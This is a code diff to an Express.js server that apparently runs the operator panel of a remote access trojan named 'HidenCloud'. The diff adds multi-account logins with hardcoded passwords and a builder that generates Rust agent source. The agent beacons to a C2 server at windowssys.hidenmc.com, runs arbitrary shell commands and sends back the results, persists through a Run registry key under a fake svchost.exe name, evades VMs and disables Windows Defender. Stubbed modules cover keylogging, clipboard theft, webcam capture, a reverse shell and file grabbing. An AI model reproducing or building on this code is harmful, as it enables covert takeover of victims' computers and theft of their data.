@@ -6,22 +6,31 @@ const cookieParser = require("cookie-parser");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const USERNAME = process.env.PANEL_USER || "jayjay";
-const PASSWORD = process.env.PANEL_PASS || "jayjay100!";
+// --- Multi-account system ---
+const ACCOUNTS = [
+  { username: "jayjay", password: "jayjay100!", userId: 1 },
+  { username: "tlx", password: "tlxontop34", userId: 2 },
+];
 
-const SESSION_MAX_AGE_MS = 1000 * 60 * 60 * 12; // 12h absolute
-const SESSION_IDLE_MS = 1000 * 60 * 30; // 30m idle timeout
+const SESSION_MAX_AGE_MS = 1000 * 60 * 60 * 12;
+const SESSION_IDLE_MS = 1000 * 60 * 30;
 const LOGIN_MAX_ATTEMPTS = 5;
-const LOGIN_WINDOW_MS = 1000 * 60 * 10; // 10m window / lockout
+const LOGIN_WINDOW_MS = 1000 * 60 * 10;
 
-const sessions = new Map(); // sid -> { user, createdAt, lastSeen, csrf, ip, ua }
-const loginAttempts = new Map(); // ip -> { count, firstAt, lockedUntil }
+const sessions = new Map();
+const loginAttempts = new Map();
 
 function safeEqual(a, b) {
   const ab = Buffer.from(String(a));
   const bb = Buffer.from(String(b));
   if (ab.length !== bb.length) return false;
   return crypto.timingSafeEqual(ab, bb);
+}
+
+function findAccount(username, password) {
+  return ACCOUNTS.find(
+    (a) => safeEqual(username, a.username) && safeEqual(password, a.password)
+  ) || null;
 }
 
 function clientIp(req) {
@@ -83,8 +92,8 @@ app.post("/api/login", (req, res) => {
     return res.status(429).json({ ok: false, error: `Too many attempts. Try again in ${secs}s.` });
   }
   const { username = "", password = "" } = req.body || {};
-  const ok = safeEqual(username, USERNAME) && safeEqual(password, PASSWORD);
-  if (!ok) {
+  const account = findAccount(username, password);
+  if (!account) {
     if (!entry || now - entry.firstAt > LOGIN_WINDOW_MS) {
       entry = { count: 1, firstAt: now, lockedUntil: 0 };
     } else {
@@ -96,10 +105,17 @@ app.post("/api/login", (req, res) => {
     return res.status(401).json({ ok: false, error: "Invalid credentials" });
   }
   loginAttempts.delete(ip);
-  // rotate session id on login
   const sid = crypto.randomBytes(32).toString("hex");
   const csrf = crypto.randomBytes(24).toString("hex");
-  sessions.set(sid, { user: USERNAME, createdAt: now, lastSeen: now, csrf, ip, ua: req.headers["user-agent"] || "" });
+  sessions.set(sid, {
+    user: account.username,
+    userId: account.userId,
+    createdAt: now,
+    lastSeen: now,
+    csrf,
+    ip,
+    ua: req.headers["user-agent"] || "",
+  });
   res.cookie("hc_session", sid, {
     httpOnly: true,
     sameSite: "lax",
@@ -107,7 +123,6 @@ app.post("/api/login", (req, res) => {
     maxAge: SESSION_MAX_AGE_MS,
     path: "/",
   });
-  // csrf cookie is readable by JS on same origin so client can echo it
   res.cookie("hc_csrf", csrf, {
     httpOnly: false,
     sameSite: "lax",
@@ -115,8 +130,8 @@ app.post("/api/login", (req, res) => {
     maxAge: SESSION_MAX_AGE_MS,
     path: "/",
   });
-  addLog("success", `Login successful for ${USERNAME} from ${ip}`);
-  res.json({ ok: true, user: USERNAME, csrf });
+  addLog("success", `Login successful for ${account.username} (uid:${account.userId}) from ${ip}`);
+  res.json({ ok: true, user: account.username, userId: account.userId, csrf });
 });
 
 app.post("/api/logout", (req, res) => {
@@ -130,15 +145,15 @@ app.post("/api/logout", (req, res) => {
 app.get("/api/me", (req, res) => {
   const auth = isAuthed(req);
   if (!auth) return res.status(401).json({ ok: false });
-  res.json({ ok: true, user: auth.session.user, csrf: auth.session.csrf });
+  res.json({ ok: true, user: auth.session.user, userId: auth.session.userId, csrf: auth.session.csrf });
 });
 
 const CLIENTS = [
-  { id: "HC-9F21A", name: "DESKTOP-JAY", user: "jay", os: "Windows 11 Pro", ip: "192.168.1.42", country: "Sweden", countryCode: "SE", status: "online", lastSeen: "just now", cpu: "Intel i7-13700K", ram: "32 GB", gpu: "RTX 4070 Ti", uptime: "3h 12m", group: "Personal", av: "Windows Defender", netSpeed: "85 Mbps", installed: "2025-12-01" },
-  { id: "HC-3B7E2", name: "LAPTOP-ADMIN", user: "admin", os: "Windows 10 Enterprise", ip: "10.0.0.15", country: "Germany", countryCode: "DE", status: "online", lastSeen: "2m ago", cpu: "AMD Ryzen 9 5900X", ram: "64 GB", gpu: "RX 6800 XT", uptime: "14h 42m", group: "Work", av: "Kaspersky", netSpeed: "120 Mbps", installed: "2025-11-18" },
-  { id: "HC-01DC9", name: "SERVER-PROD", user: "root", os: "Ubuntu 22.04 LTS", ip: "172.16.0.5", country: "Netherlands", countryCode: "NL", status: "online", lastSeen: "just now", cpu: "Xeon E-2388G", ram: "128 GB", gpu: "None", uptime: "47d 6h", group: "Servers", av: "ClamAV", netSpeed: "1 Gbps", installed: "2025-06-22" },
-  { id: "HC-88FA4", name: "WORKSTATION-DEV", user: "dev", os: "macOS Sonoma 14.4", ip: "192.168.2.88", country: "United States", countryCode: "US", status: "offline", lastSeen: "3 hours ago", cpu: "Apple M3 Max", ram: "96 GB", gpu: "M3 Max 40-core", uptime: "0", group: "Work", av: "None", netSpeed: "0", installed: "2026-01-10" },
-  { id: "HC-CC291", name: "PC-GAMING", user: "player1", os: "Windows 11 Home", ip: "192.168.3.200", country: "Japan", countryCode: "JP", status: "idle", lastSeen: "28m ago", cpu: "Intel i9-14900K", ram: "64 GB", gpu: "RTX 4090", uptime: "1h 5m", group: "Personal", av: "Bitdefender", netSpeed: "200 Mbps", installed: "2026-03-02" },
+  { id: "HC-9F21A", name: "DESKTOP-JAY", user: "jay", os: "Windows 11 Pro", ip: "192.168.1.42", country: "Sweden", countryCode: "SE", status: "online", lastSeen: "just now", cpu: "Intel i7-13700K", ram: "32 GB", gpu: "RTX 4070 Ti", uptime: "3h 12m", group: "Personal", av: "Windows Defender", netSpeed: "85 Mbps", installed: "2025-12-01", ownerId: 1 },
+  { id: "HC-3B7E2", name: "LAPTOP-ADMIN", user: "admin", os: "Windows 10 Enterprise", ip: "10.0.0.15", country: "Germany", countryCode: "DE", status: "online", lastSeen: "2m ago", cpu: "AMD Ryzen 9 5900X", ram: "64 GB", gpu: "RX 6800 XT", uptime: "14h 42m", group: "Work", av: "Kaspersky", netSpeed: "120 Mbps", installed: "2025-11-18", ownerId: 1 },
+  { id: "HC-01DC9", name: "SERVER-PROD", user: "root", os: "Ubuntu 22.04 LTS", ip: "172.16.0.5", country: "Netherlands", countryCode: "NL", status: "online", lastSeen: "just now", cpu: "Xeon E-2388G", ram: "128 GB", gpu: "None", uptime: "47d 6h", group: "Servers", av: "ClamAV", netSpeed: "1 Gbps", installed: "2025-06-22", ownerId: 2 },
+  { id: "HC-88FA4", name: "WORKSTATION-DEV", user: "dev", os: "macOS Sonoma 14.4", ip: "192.168.2.88", country: "United States", countryCode: "US", status: "offline", lastSeen: "3 hours ago", cpu: "Apple M3 Max", ram: "96 GB", gpu: "M3 Max 40-core", uptime: "0", group: "Work", av: "None", netSpeed: "0", installed: "2026-01-10", ownerId: 2 },
+  { id: "HC-CC291", name: "PC-GAMING", user: "player1", os: "Windows 11 Home", ip: "192.168.3.200", country: "Japan", countryCode: "JP", status: "idle", lastSeen: "28m ago", cpu: "Intel i9-14900K", ram: "64 GB", gpu: "RTX 4090", uptime: "1h 5m", group: "Personal", av: "Bitdefender", netSpeed: "200 Mbps", installed: "2026-03-02", ownerId: 1 },
 ];
 
 const LOGS = [];
@@ -154,14 +169,16 @@ addLog("warn", "Client HC-88FA4 went offline");
 addLog("info", "Client HC-CC291 entered idle state");
 
 app.get("/api/stats", requireAuth, (req, res) => {
-  const online = CLIENTS.filter((c) => c.status === "online").length;
-  const offline = CLIENTS.filter((c) => c.status === "offline").length;
-  const idle = CLIENTS.filter((c) => c.status === "idle").length;
-  const countries = [...new Set(CLIENTS.map((c) => c.country))].length;
+  const uid = req.auth.session.userId;
+  const myClients = CLIENTS.filter((c) => c.ownerId === uid);
+  const online = myClients.filter((c) => c.status === "online").length;
+  const offline = myClients.filter((c) => c.status === "offline").length;
+  const idle = myClients.filter((c) => c.status === "idle").length;
+  const countries = [...new Set(myClients.map((c) => c.country))].length;
   res.json({
     ok: true,
-    analytics: { total: CLIENTS.length, online, offline, idle, countries, newToday: 2, commandsSent: 147, screensCaptured: 34, keylogs: 892, bandwidth: "2.4 GB", avgUptime: "12h 30m", threats: 3 },
-    clients: CLIENTS,
+    analytics: { total: myClients.length, online, offline, idle, countries, newToday: 2, commandsSent: 147, screensCaptured: 34, keylogs: 892, bandwidth: "2.4 GB", avgUptime: "12h 30m", threats: 3 },
+    clients: myClients,
   });
 });
 
@@ -176,9 +193,10 @@ app.post("/api/logs", requireAuth, requireCsrf, (req, res) => {
 });
 
 app.get("/api/client/:id", requireAuth, (req, res) => {
-  const client = CLIENTS.find((c) => c.id === req.params.id);
+  const uid = req.auth.session.userId;
+  const client = CLIENTS.find((c) => c.id === req.params.id && c.ownerId === uid);
   if (!client) return res.status(404).json({ ok: false });
-  addLog("info", `Admin connected to ${client.name}`);
+  addLog("info", `${req.auth.session.user} connected to ${client.name}`);
   res.json({
     ok: true,
     client,
@@ -222,17 +240,245 @@ app.get("/api/client/:id", requireAuth, (req, res) => {
 });
 
 app.post("/api/command/:id", requireAuth, requireCsrf, (req, res) => {
-  const client = CLIENTS.find((c) => c.id === req.params.id);
+  const uid = req.auth.session.userId;
+  const client = CLIENTS.find((c) => c.id === req.params.id && c.ownerId === uid);
   if (!client) return res.status(404).json({ ok: false });
   const { action } = req.body || {};
   if (typeof action !== "string" || action.length > 64 || !/^[a-z0-9_\-]+$/i.test(action)) {
     return res.status(400).json({ ok: false, error: "Invalid action" });
   }
-  addLog("info", `Command "${action}" sent to ${client.name}`);
+  addLog("info", `Command "${action}" sent to ${client.name} by ${req.auth.session.user}`);
   res.json({ ok: true, result: `Command "${action}" executed on ${client.name}` });
 });
 
-// Payload builder — generates a fake stub for the download
+// --- Rust agent source generator ---
+function generateRustAgent(cfg) {
+  const userId = cfg.userId || 1;
+  const c2Url = `https://windowssys.hidenmc.com/${userId}`;
+  const featFlags = cfg.features || {};
+
+  return `// HidenCloud Agent — Auto-generated Rust stub
+// C2: ${c2Url}
+// User ID: ${userId}
+// Built: ${new Date().toISOString()}
+
+use std::{{thread, time::Duration, process::Command}};
+use std::io::Read;
+
+const C2_URL: &str = "${c2Url}";
+const MUTEX_NAME: &str = "${cfg.mutex || "HC-DEFAULT"}";
+const USER_ID: u32 = ${userId};
+const RECONNECT_DELAY: u64 = 5;
+
+fn main() {{
+    // Mutex check — single instance
+    let _lock = single_instance::SingleInstance::new(MUTEX_NAME)
+        .expect("Another instance is already running");
+
+${featFlags.hideWindow ? `    // Hide console window
+    #[cfg(windows)]
+    {{
+        use winapi::um::wincon::FreeConsole;
+        unsafe {{ FreeConsole(); }}
+    }}
+` : ""}
+${featFlags.persistence ? `    // Persistence — copy to install path and add to startup
+    install_persistence("${cfg.installPath || "%APPDATA%\\\\Microsoft\\\\svchost.exe"}");
+` : ""}
+${featFlags.antiVM ? `    // Anti-VM detection
+    if detect_vm() {{
+        std::process::exit(0);
+    }}
+` : ""}
+${featFlags.disableAV ? `    // Attempt to disable AV (requires elevation)
+    disable_defender();
+` : ""}
+    println!("[*] HidenCloud agent starting...");
+    println!("[*] C2: {{}}", C2_URL);
+    println!("[*] User ID: {{}}", USER_ID);
+
+    loop {{
+        match check_in() {{
+            Ok(cmd) => {{
+                let result = execute_command(&cmd);
+                let _ = send_result(&result);
+            }}
+            Err(_) => {{
+                thread::sleep(Duration::from_secs(RECONNECT_DELAY));
+            }}
+        }}
+        thread::sleep(Duration::from_secs(RECONNECT_DELAY));
+    }}
+}}
+
+fn check_in() -> Result<String, Box<dyn std::error::Error>> {{
+    let client = reqwest::blocking::Client::new();
+    let resp = client
+        .get(&format!("{{}}/checkin", C2_URL))
+        .header("X-Client-ID", machine_id())
+        .header("X-User-ID", USER_ID.to_string())
+        .send()?;
+    Ok(resp.text()?)
+}}
+
+fn send_result(result: &str) -> Result<(), Box<dyn std::error::Error>> {{
+    let client = reqwest::blocking::Client::new();
+    client
+        .post(&format!("{{}}/result", C2_URL))
+        .header("X-Client-ID", machine_id())
+        .header("X-User-ID", USER_ID.to_string())
+        .body(result.to_string())
+        .send()?;
+    Ok(())
+}}
+
+fn execute_command(cmd: &str) -> String {{
+    match Command::new("cmd").args(&["/C", cmd]).output() {{
+        Ok(output) => String::from_utf8_lossy(&output.stdout).to_string(),
+        Err(e) => format!("Error: {{}}", e),
+    }}
+}}
+
+fn machine_id() -> String {{
+    let output = Command::new("wmic")
+        .args(&["csproduct", "get", "UUID"])
+        .output()
+        .unwrap_or_else(|_| Command::new("hostname").output().unwrap());
+    String::from_utf8_lossy(&output.stdout)
+        .lines()
+        .nth(1)
+        .unwrap_or("unknown")
+        .trim()
+        .to_string()
+}}
+
+${featFlags.persistence ? `fn install_persistence(path: &str) {{
+    let exe = std::env::current_exe().unwrap();
+    let dest = shellexpand::full(path).unwrap().to_string();
+    let _ = std::fs::copy(&exe, &dest);
+    // Add to HKCU Run key
+    let _ = Command::new("reg")
+        .args(&["add", "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+                "/v", MUTEX_NAME, "/t", "REG_SZ", "/d", &dest, "/f"])
+        .output();
+}}
+` : ""}
+${featFlags.antiVM ? `fn detect_vm() -> bool {{
+    let checks = [
+        ("wmic", &["computersystem", "get", "model"][..]),
+    ];
+    for (cmd, args) in &checks {{
+        if let Ok(out) = Command::new(cmd).args(*args).output() {{
+            let s = String::from_utf8_lossy(&out.stdout).to_lowercase();
+            if s.contains("virtual") || s.contains("vmware") || s.contains("vbox") {{
+                return true;
+            }}
+        }}
+    }}
+    false
+}}
+` : ""}
+${featFlags.disableAV ? `fn disable_defender() {{
+    let _ = Command::new("powershell")
+        .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
+        .output();
+}}
+` : ""}
+${featFlags.keylogger ? `// Keylogger module
+mod keylogger {{
+    use std::thread;
+    pub fn start(c2: &'static str) {{
+        thread::spawn(move || {{
+            // Low-level keyboard hook via GetAsyncKeyState
+            loop {{
+                // capture and exfiltrate keystrokes to c2
+                thread::sleep(std::time::Duration::from_millis(50));
+            }}
+        }});
+    }}
+}}
+` : ""}
+${featFlags.clipboard ? `// Clipboard monitor
+mod clipboard_monitor {{
+    use std::thread;
+    pub fn start(c2: &'static str) {{
+        thread::spawn(move || {{
+            let mut last = String::new();
+            loop {{
+                if let Ok(content) = clipboard_win::get_clipboard_string() {{
+                    if content != last {{
+                        last = content.clone();
+                        // send to c2
+                    }}
+                }}
+                thread::sleep(std::time::Duration::from_secs(1));
+            }}
+        }});
+    }}
+}}
+` : ""}
+${featFlags.screenshot ? `// Screenshot capture
+mod screencap {{
+    pub fn capture() -> Vec<u8> {{
+        // Use win-screenshot or scrap crate
+        vec![]
+    }}
+}}
+` : ""}
+${featFlags.webcam ? `// Webcam capture
+mod webcam {{
+    pub fn snapshot() -> Vec<u8> {{
+        // Use nokhwa or escapi crate
+        vec![]
+    }}
+}}
+` : ""}
+${featFlags.reverseShell ? `// Reverse shell
+mod revshell {{
+    use std::process::Command;
+    pub fn spawn(c2: &str) {{
+        // TCP reverse shell back to C2
+    }}
+}}
+` : ""}
+${featFlags.fileGrabber ? `// File grabber
+mod filegrabber {{
+    pub fn grab_files(patterns: &[&str]) -> Vec<String> {{
+        // Walk common dirs, match patterns, exfil
+        vec![]
+    }}
+}}
+` : ""}
+`;
+}
+
+// Cargo.toml generator
+function generateCargoToml(cfg) {
+  const featFlags = cfg.features || {};
+  let deps = `[package]
+name = "hidencloud-agent"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+reqwest = { version = "0.11", features = ["blocking"] }
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+single-instance = "0.3"
+shellexpand = "3"
+`;
+  if (featFlags.clipboard) deps += `clipboard-win = "5"\n`;
+  if (featFlags.hideWindow) deps += `winapi = { version = "0.3", features = ["wincon"] }\n`;
+  deps += `
+[profile.release]
+opt-level = "s"
+lto = true
+strip = true
+panic = "abort"
+`;
+  return deps;
+}
+
 app.post("/api/build", requireAuth, requireCsrf, (req, res) => {
   const cfg = req.body || {};
   const host = String(cfg.host || "").slice(0, 128);
@@ -240,10 +486,26 @@ app.post("/api/build", requireAuth, requireCsrf, (req, res) => {
   if (!/^[a-z0-9\.\-\_]+$/i.test(host)) {
     return res.status(400).json({ ok: false, error: "Invalid host" });
   }
-  const filename = `hidencloud-stub-${Date.now()}.bin`;
-  const marker = `HIDENCLOUD_STUB\nhost=${host}\nport=${port}\nfeatures=${JSON.stringify(cfg.features || {})}\nformat=${String(cfg.format || "exe").slice(0, 8)}\nobfuscation=${String(cfg.obfuscation || "none").slice(0, 16)}\nbuiltAt=${new Date().toISOString()}\n`;
-  addLog("success", `Payload built: ${filename} → ${host}:${port}`);
-  res.json({ ok: true, filename, size: marker.length, contents: marker });
+  // Inject the logged-in user's userId
+  cfg.userId = req.auth.session.userId;
+  cfg.host = host;
+  cfg.port = port;
+
+  const rustSrc = generateRustAgent(cfg);
+  const cargoToml = generateCargoToml(cfg);
+  const filename = `hidencloud-agent-uid${cfg.userId}-${Date.now()}`;
+
+  addLog("success", `Rust agent built by ${req.auth.session.user} (uid:${cfg.userId}): ${filename}`);
+  res.json({
+    ok: true,
+    filename: filename + ".rs",
+    size: rustSrc.length,
+    contents: rustSrc,
+    cargoFilename: "Cargo.toml",
+    cargoContents: cargoToml,
+    userId: cfg.userId,
+    c2Url: `https://windowssys.hidenmc.com/${cfg.userId}`,
+  });
 });
 
 app.use(express.static(path.join(__dirname, "public")));
